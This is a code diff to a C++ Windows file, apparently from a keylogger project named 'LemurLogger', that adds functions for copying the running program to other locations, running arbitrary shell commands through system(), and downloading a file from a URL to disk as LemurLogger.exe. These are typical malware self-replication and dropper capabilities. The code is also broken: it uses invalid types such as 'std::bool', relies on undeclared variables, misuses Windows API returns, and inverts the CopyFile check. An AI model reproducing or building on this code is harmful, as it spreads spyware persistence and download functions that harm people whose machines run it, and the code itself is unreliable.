@@ -7,6 +7,8 @@
 #include <windows.h>
 #include "Helper.h"
 #include "Base64.h"
+#include <Urlmon.h>
+#include <tchar.h>
 
 namespace IO
 {
@@ -59,6 +61,93 @@ namespace IO
       return "";
     }
   }
+    
+    
+    std::bool copy(std::string path,std::string filename){
+        TCHAR szExeFileName[MAX_PATH];
+        //get self name
+        std::string cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+        //open self
+        ifstream initialFile(cur_path_filename, ios::in|ios::binary);
+        //open outfile
+        ofstream outputFile(path+filename, ios::out|ios::binary);
+        //read pointer to end binary
+        initialFile.seekg(0, ios::end);
+        //set fileSize call buffer
+        long fileSize = initialFile.tellg();
+        if(initialFile.is_open() && outputFile.is_open())
+        {
+            short * buffer = new short[fileSize/2];
+            initialFile.seekg(0, ios::beg);
+            initialFile.read((char*)buffer, fileSize);
+            outputFile.write((char*)buffer, fileSize);
+            delete[] buffer;
+        }
+        else if(!outputFile.is_open())
+        {
+            return false;
+        }
+        else if(!initialFile.is_open())
+        {
+            return false;
+        }
+        
+        initialFile.close();
+        outputFile.close();
+        return true;
+    }
+    
+    
+    
+    std::void shell_cmd(std::string command){
+        system(command);
+    }
+    
+    std::bool copy_w_cmd(std::string path,std::string filename){
+        std::string cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+        std::string command = "cp "+cur_path_filename+" "+path+filename;
+        try {
+            system(command);
+        } catch (std::exception const& e) {
+            return false;
+        }
+        return true;
+    
+    }
+    
+    std::bool ms_Copyfile(const char * desfile_path){
+        const char * cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+        if (CopyFile (cur_path_filename, desfile_path, true))
+            return false;
+        
+        else
+           return true;
+        
+    }
+    
+    std::bool download_File(std::string urlfile,TCHAR * despath)
+    {
+        
+        TCHAR url[] = TEXT(urlfile);
+        TCHAR path[MAX_PATH] = despath;
+        //GetCurrentDirectory(MAX_PATH, path);
+        wsprintf(path, TEXT("%s\\LemurLogger.exe"), path);
+        //printf("Path: %S\n", path);
+        HRESULT res = URLDownloadToFile(NULL, url, path, 0, NULL);
+        if(res == S_OK) {
+            return true;
+        } else if(res == E_OUTOFMEMORY) {
+            return false;
+            
+        } else if(res == INET_E_DOWNLOAD_FAILURE) {
+            return false;
+            
+        } else {
+            return false;
+        }
+        
+        return false;
+    }
 }
 
 
